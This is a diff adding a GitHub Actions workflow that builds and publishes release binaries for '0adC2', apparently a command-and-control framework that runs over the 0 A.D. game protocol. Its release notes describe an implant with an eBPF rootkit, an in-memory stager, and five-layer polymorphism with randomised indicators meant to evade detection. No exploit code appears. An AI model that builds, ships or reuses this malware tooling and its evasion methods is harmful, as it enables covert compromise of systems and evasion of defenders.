@@ -1,0 +1,142 @@
+name: Build and Release
+
+on:
+  push:
+    tags:
+      - 'v*.*.*'
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    name: Build Release Binaries
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y \
+            gcc clang gcc-multilib binutils \
+            libsodium-dev libenet-dev libreadline-dev \
+            python3 linux-headers-generic
+
+      - name: Get version from tag
+        id: version
+        run: echo "VERSION=${GITHUB_REF#refs/tags/}" >> $GITHUB_OUTPUT
+
+      - name: Python syntax check (tools)
+        run: |
+          for f in tools/*.py; do
+            python3 -m py_compile "$f" && echo "[ok] $f" || exit 1
+          done
+
+      - name: BPF syntax check
+        run: |
+          BPF_INC="-I/usr/include/x86_64-linux-gnu -I/usr/include"
+          BPF_FLAGS="-O2 -target bpf -D__TARGET_ARCH_x86 -Wno-macro-redefined -fsyntax-only"
+          clang $BPF_FLAGS $BPF_INC src/bpf_rootkit.bpf.c && echo "[ok] bpf_rootkit.bpf.c"
+          clang $BPF_FLAGS $BPF_INC src/hide_proc.bpf.c   && echo "[ok] hide_proc.bpf.c"
+
+      - name: Build standard prod (IOCs randomised)
+        run: |
+          make fresh_all
+          echo "=== Standard build SHA256 ===" && sha256sum agent ctrl stager stage_srv
+          # Preserve standard stage_srv before poly_all overwrites it
+          cp stage_srv stage_srv_std
+
+      - name: Build polymorphic prod (5-layer poly)
+        run: |
+          make poly_all
+          echo "=== Poly build SHA256 ===" && sha256sum agent ctrl stager stage_srv
+          cp agent     agent_poly
+          cp ctrl      ctrl_poly
+          cp stager    stager_poly
+          cp stage_srv stage_srv_poly
+
+      - name: Package binaries
+        run: |
+          VERSION=${{ steps.version.outputs.VERSION }}
+          tar -czf 0adc2-agent-linux-amd64-${VERSION}.tar.gz               agent
+          tar -czf 0adc2-ctrl-linux-amd64-${VERSION}.tar.gz                ctrl
+          tar -czf 0adc2-stager-linux-amd64-${VERSION}.tar.gz              stager
+          tar -czf 0adc2-stage-srv-linux-amd64-${VERSION}.tar.gz           stage_srv_std
+          tar -czf 0adc2-agent-poly-linux-amd64-${VERSION}.tar.gz          agent_poly
+          tar -czf 0adc2-ctrl-poly-linux-amd64-${VERSION}.tar.gz           ctrl_poly
+          tar -czf 0adc2-stager-poly-linux-amd64-${VERSION}.tar.gz         stager_poly
+          tar -czf 0adc2-stage-srv-poly-linux-amd64-${VERSION}.tar.gz      stage_srv_poly
+
+      - name: Generate checksums
+        run: sha256sum *.tar.gz > checksums.txt
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: release-binaries
+          path: |
+            *.tar.gz
+            checksums.txt
+
+  release:
+    name: Create GitHub Release
+    needs: build
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Download artifacts
+        uses: actions/download-artifact@v4
+        with:
+          name: release-binaries
+
+      - name: Get version
+        id: version
+        run: echo "VERSION=${GITHUB_REF#refs/tags/}" >> $GITHUB_OUTPUT
+
+      - name: Create Release
+        uses: softprops/action-gh-release@v1
+        with:
+          tag_name: ${{ steps.version.outputs.VERSION }}
+          name: "0adC2 ${{ steps.version.outputs.VERSION }}"
+          body: |
+            ## 0adC2 ${{ steps.version.outputs.VERSION }}
+
+            C2 framework over 0 A.D. game protocol (ENet UDP/20595).
+
+            ### Components
+            - **agent** — implant (Linux x86_64, stripped, daemonizes, eBPF rootkit)
+            - **ctrl** — controller with readline, ECDH, multi-agent
+            - **stager** — in-memory loader (~14 KB, no disk write, ECDH chain)
+            - **stage_srv** — staging server for stager delivery
+
+            ### Two build variants shipped
+            | Artifact | Build | Notes |
+            |---|---|---|
+            | `agent`, `ctrl`, `stager`, `stage_srv` | `make fresh_all` | Standard, IOCs randomised |
+            | `agent_poly`, `ctrl_poly`, `stager_poly`, `stage_srv_poly` | `make poly_all` | 5-layer binary polymorphism |
+
+            ### Binary polymorphism (poly builds)
+            1. **CFG method selection** — fork/exec/name-hide variant differs per build
+            2. **Dead-code junk stubs** — 6–14 `noinline` functions behind an always-false guard
+            3. **Live idempotent junk macros** — execute unconditionally, defeat dynamic-analysis coverage stripping
+            4. **GCC seed/alignment flags** — `-frandom-seed`, `-fstack-reuse=none`, `-falign-*`
+            5. **IOC randomisation** — keys, player names, BPF XOR key
+
+            ### Notes
+            - IOCs randomised at build time — each release has unique static signatures.
+            - Requires a running 0 A.D. dedicated server on UDP/20595 as C2 relay.
+            - Read [README.md](https://github.com/franckferman/0adC2/blob/stable/README.md) before use.
+
+            **Verify checksums**: `checksums.txt`
+          files: |
+            *.tar.gz
+            checksums.txt
+          draft: false
+          prerelease: false
+          generate_release_notes: true
